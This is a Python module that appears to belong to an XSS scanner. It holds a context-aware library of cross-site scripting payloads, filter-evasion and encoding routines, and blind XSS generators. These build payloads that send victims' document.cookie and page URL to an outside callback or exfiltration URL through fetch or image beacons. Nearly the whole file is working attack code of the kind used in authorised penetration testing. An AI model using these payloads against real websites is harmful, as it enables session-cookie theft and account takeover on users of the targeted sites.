"""
Advanced payload generation module with comprehensive XSS payload library.
"""

import random
import string
from typing import Dict, List
from dataclasses import dataclass
from enum import Enum


class PayloadContext(Enum):
    """Payload execution contexts."""
    HTML = "html"
    ATTR_DOUBLE = "attr_double"
    ATTR_SINGLE = "attr_single"
    ATTR_UNQUOTED = "attr_unquoted"
    JAVASCRIPT = "javascript"
    CSS = "css"
    URL = "url"
    SVG = "svg"
    TEMPLATE = "template"


@dataclass
class Payload:
    """XSS payload with metadata."""
    template: str
    context: PayloadContext
    marker: str
    description: str
    tamper_resistant: bool = False
    obfuscated: bool = False


class PayloadGenerator:
    """
    Comprehensive XSS payload generator.
    Generates context-aware payloads with various evasion techniques.
    """

    # Basic HTML payloads
    HTML_PAYLOADS = [
        "<script>{marker}</script>",
        "<img src=x onerror={marker}>",
        "<svg/onload={marker}>",
        "<body onload={marker}>",
        "<iframe srcdoc=\"<script>{marker}</script>\">",
        "<details open ontoggle={marker}>",
        "<marquee onstart={marker}>",
        "<input autofocus onfocus={marker}>",
        "<select onfocus={marker} autofocus>",
        "<textarea onfocus={marker} autofocus>",
        "<keygen onfocus={marker} autofocus>",
        "<video><source onerror={marker}>",
        "<audio src=x onerror={marker}>",
        "<audio src=x oncanplay={marker}>",
        "<video><track default oncuechange={marker}>",
        "<form><button formaction=javascript:{marker}>",
        "<svg><animate onbegin={marker}>",
    ]

    # Attribute payloads
    ATTR_DOUBLE_PAYLOADS = [
        "\" onerror={marker} \"",
        "\" onmouseover={marker} \"",
        "\" autofocus onfocus={marker} \"",
        "\"><script>{marker}</script>",
        "\" x=\"y\" onerror={marker} \"",
    ]

    ATTR_SINGLE_PAYLOADS = [
        "' onerror={marker} '",
        "' onmouseover={marker} '",
        "' autofocus onfocus={marker} '",
        "'><script>{marker}</script>",
        "' x='y' onerror={marker} '",
    ]

    ATTR_UNQUOTED_PAYLOADS = [
        " onerror={marker} ",
        " onmouseover={marker} ",
        " autofocus onfocus={marker} ",
        "><script>{marker}</script>",
        " x=y onerror={marker} ",
    ]

    # JavaScript payloads
    JS_PAYLOADS = [
        ";{marker}//",
        ");{marker}//",
        "}};{marker}//",
        "{marker}()",
        "window['{marker}']",
        "this['{marker}']",
        "eval('{marker}')",
        "Function('{marker}')()",
        "setTimeout('{marker}')",
        "setInterval('{marker}')",
        ";{marker}`1`//",
        ";location='javascript:'+{marker}//",
        ";throw onerror={marker},1//",
    ]

    # CSS payloads
    CSS_PAYLOADS = [
        ";expression({marker})",
        "};{marker};{",
        "x:expression({marker})",
        "background:url('javascript:{marker}')",
    ]

    # URL payloads
    URL_PAYLOADS = [
        "javascript:{marker}",
        "data:text/html,<script>{marker}</script>",
    ]

    # SVG payloads
    SVG_PAYLOADS = [
        "<svg onload={marker}>",
        "<svg><script>{marker}</script></svg>",
        "<svg><animate attributeName=href values=javascript:{marker}>",
    ]

    # Polyglot payloads (work in multiple contexts)
    POLYGLOT_PAYLOADS = [
        "<script>/*<sCRIPT%20src=x%20onerror={marker}>*/</script>",
        "<script>/*<script>{marker}</script>*/</script>",
        "\"'><script>{marker}</script>",
        "<img src=x onerror={marker}>\"'><script>{marker}</script>",
        "javascript:/*'<script>{marker}</script>*/",
    ]

    # Obfuscated payloads
    OBFUSCATED_PAYLOADS = [
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        "<script>alert&#40;1&#41;</script>",
        "<script>alert(String.fromCharCode(49))</script>",
        "<script>\u0061\u006c\u0065\u0072\u0074(1)</script>",
        "<script>alert(1)//\n</script>",
    ]

    # Filter evasion payloads
    EVASION_PAYLOADS = [
        "<script>{marker}</script>",
        "<script >{marker}</script>",
        "<script\n>{marker}</script>",
        "<script/**/{marker}</script>",
        "<script/* */{marker}</script>",
        "<sCrIpT>{marker}</sCrIpT>",
        "<script%20{marker}</script>",
    ]

    def __init__(self):
        self._context_map = {
            PayloadContext.HTML: self.HTML_PAYLOADS,
            PayloadContext.ATTR_DOUBLE: self.ATTR_DOUBLE_PAYLOADS,
            PayloadContext.ATTR_SINGLE: self.ATTR_SINGLE_PAYLOADS,
            PayloadContext.ATTR_UNQUOTED: self.ATTR_UNQUOTED_PAYLOADS,
            PayloadContext.JAVASCRIPT: self.JS_PAYLOADS,
            PayloadContext.CSS: self.CSS_PAYLOADS,
            PayloadContext.URL: self.URL_PAYLOADS,
            PayloadContext.SVG: self.SVG_PAYLOADS,
        }

    def generate_payloads(
        self,
        context: PayloadContext,
        marker: str,
        count: int = 10,
        include_polyglots: bool = False,
        include_obfuscated: bool = False,
        include_evasion: bool = False
    ) -> List[Payload]:
        """
        Generate XSS payloads for a specific context.

        Args:
            context: Target execution context
            marker: Unique marker for verification
            count: Number of payloads to generate
            include_polyglots: Include polyglot payloads
            include_obfuscated: Include obfuscated payloads
            include_evasion: Include filter evasion payloads

        Returns:
            List of Payload objects
        """
        payloads = []

        # Get context-specific payloads
        templates = self._context_map.get(context, self.HTML_PAYLOADS)

        # Generate standard payloads
        for template in templates[:count]:
            payloads.append(Payload(
                template=template,
                context=context,
                marker=marker,
                description=f"Standard {context.value} payload"
            ))

        # Add polyglot payloads if requested
        if include_polyglots:
            for template in self.POLYGLOT_PAYLOADS[:3]:
                payloads.append(Payload(
                    template=template,
                    context=context,
                    marker=marker,
                    description="Polyglot payload",
                    tamper_resistant=True
                ))

        # Add obfuscated payloads if requested
        if include_obfuscated:
            for template in self.OBFUSCATED_PAYLOADS[:2]:
                payloads.append(Payload(
                    template=template,
                    context=context,
                    marker=marker,
                    description="Obfuscated payload",
                    obfuscated=True
                ))

        # Add evasion payloads if requested
        if include_evasion:
            for template in self.EVASION_PAYLOADS[:3]:
                payloads.append(Payload(
                    template=template,
                    context=context,
                    marker=marker,
                    description="Filter evasion payload",
                    tamper_resistant=True
                ))

        return payloads[:count]

    def generate_custom_payload(
        self,
        template: str,
        marker: str,
        context: PayloadContext = PayloadContext.HTML
    ) -> Payload:
        """Generate a custom payload from a template."""
        return Payload(
            template=template,
            context=context,
            marker=marker,
            description="Custom payload"
        )

    def generate_blind_payload(
        self,
        exfil_url: str,
        marker: str,
        context: PayloadContext = PayloadContext.HTML
    ) -> Payload:
        """Generate a blind XSS payload for exfiltration."""
        if context == PayloadContext.HTML:
            template = f"<script>fetch('{exfil_url}?m={marker}&c='+document.cookie)</script>"
        elif context == PayloadContext.ATTR_DOUBLE:
            template = f'" onerror="fetch(\'{exfil_url}?m={marker}&c=\'+document.cookie)"'
        elif context == PayloadContext.ATTR_SINGLE:
            template = f"' onerror='fetch(\'{exfil_url}?m={marker}&c=\'+document.cookie)'"
        elif context == PayloadContext.JAVASCRIPT:
            template = f"fetch('{exfil_url}?m={marker}&c='+document.cookie)"
        else:
            template = f"<script>fetch('{exfil_url}?m={marker}&c='+document.cookie)</script>"
        
        return Payload(
            template=template,
            context=context,
            marker=marker,
            description="Blind XSS exfiltration payload"
        )

    def generate_dom_payload(
        self,
        source: str,
        marker: str
    ) -> Payload:
        """Generate a DOM XSS payload."""
        template = f"<script>if(window.{source}){{window.__xoxss_dom.push('{marker}')}}</script>"
        return Payload(
            template=template,
            context=PayloadContext.HTML,
            marker=marker,
            description="DOM XSS payload"
        )

    def tamper_payload(
        self,
        payload: str,
        techniques: List[str]
    ) -> str:
        """
        Apply tampering techniques to a payload.

        Args:
            payload: Original payload
            techniques: List of tampering techniques to apply

        Returns:
            Tampered payload
        """
        result = payload

        for technique in techniques:
            if technique == "doubleencode":
                result = self._double_encode(result)
            elif technique == "uppercase":
                result = result.upper()
            elif technique == "hexencode":
                result = self._hex_encode(result)
            elif technique == "urlencode":
                result = self._url_encode(result)
            elif technique == "htmlentities":
                result = self._html_entities(result)
            elif technique == "jscomment":
                result = self._js_comment(result)
            elif technique == "spacetab":
                result = self._space_tab(result)
            elif technique == "jsonfuzz":
                result = self._json_fuzz(result)

        return result

    def _double_encode(self, payload: str) -> str:
        """Double URL encode the payload."""
        import urllib.parse
        return urllib.parse.quote(urllib.parse.quote(payload))

    def _hex_encode(self, payload: str) -> str:
        """Hex encode the payload."""
        return "".join(f"\\x{ord(c):02x}" for c in payload)

    def _url_encode(self, payload: str) -> str:
        """URL encode the payload."""
        import urllib.parse
        return urllib.parse.quote(payload)

    def _html_entities(self, payload: str) -> str:
        """Convert to HTML entities."""
        return "".join(f"&#{ord(c)};" for c in payload)

    def _js_comment(self, payload: str) -> str:
        """Add JavaScript comments to break filters."""
        return payload.replace("<", "</*").replace(">", "*/>")

    def _space_tab(self, payload: str) -> str:
        """Replace spaces with tabs."""
        return payload.replace(" ", "\t")

    def _json_fuzz(self, payload: str) -> str:
        """Add JSON-specific characters."""
        return payload.replace(" ", "\u0000")

    def generate_random_marker(self, length: int = 12) -> str:
        """Generate a random unique marker."""
        return "".join(random.choices(string.ascii_letters + string.digits, k=length))


# --------------------------------------------------------------------------------------
# Blind XSS / out-of-band payloads
# --------------------------------------------------------------------------------------

# Each template contains ``{beacon}``, a JS expression that fires an out-of-band
# request carrying the marker, the page URL and (best-effort) cookies.
_BLIND_TEMPLATES: Dict[str, List[str]] = {
    "html": [
        "<script>{beacon}</script>",
        '"><svg/onload="{beacon}">',
        '<img src=x onerror="{beacon}">',
        "<details open ontoggle=\"{beacon}\">",
    ],
    "attr_double": [
        '"><script>{beacon}</script>',
        '" onfocus="{beacon}" autofocus x="',
    ],
    "attr_single": [
        "'><script>{beacon}</script>",
        "' onfocus='{beacon}' autofocus x='",
    ],
    "attr_unquoted": [
        " onfocus={beacon} autofocus x=",
        "><script>{beacon}</script>",
    ],
    "script": [
        ";{beacon};//",
    ],
    "script_string": [
        '";{beacon};//',
        "';{beacon};//",
    ],
    "comment": [
        "--><script>{beacon}</script>",
    ],
    "url": [
        "javascript:{beacon}",
    ],
}

_BLIND_CONTEXTS = {
    "html": PayloadContext.HTML,
    "attr_double": PayloadContext.ATTR_DOUBLE,
    "attr_single": PayloadContext.ATTR_SINGLE,
    "attr_unquoted": PayloadContext.ATTR_UNQUOTED,
    "script": PayloadContext.JAVASCRIPT,
    "script_string": PayloadContext.JAVASCRIPT,
    "comment": PayloadContext.HTML,
    "url": PayloadContext.URL,
}


def build_blind_payloads(
    callback_url: str,
    marker: str,
    context: str = "html",
) -> List[Payload]:
    """
    Build out-of-band XSS payloads that call back to ``callback_url``.

    The callback receives ``m`` (marker), ``u`` (page URL) and ``c`` (cookies)
    query parameters, which is the convention used by XSS Hunter, interactsh
    and most self-hosted collectors.
    """
    if not callback_url:
        return []

    separator = "&" if "?" in callback_url else "?"
    callback = f"{callback_url}{separator}m={marker}"
    # Keep quotes and whitespace out of the embedded URL so the JS stays valid.
    callback = (
        callback.replace("'", "%27")
        .replace('"', "%22")
        .replace(" ", "%20")
        .replace("<", "%3C")
        .replace(">", "%3E")
    )
    beacon = (
        f"new Image().src='{callback}&u='+encodeURIComponent(location.href)"
        f"+'&c='+encodeURIComponent(document.cookie)"
    )

    templates = _BLIND_TEMPLATES.get(context) or _BLIND_TEMPLATES["html"]
    payload_context = _BLIND_CONTEXTS.get(context, PayloadContext.HTML)
    return [
        Payload(
            template=template.format(beacon=beacon),
            context=payload_context,
            marker=marker,
            description="Blind XSS out-of-band callback",
            tamper_resistant=True,
        )
        for template in templates
    ]
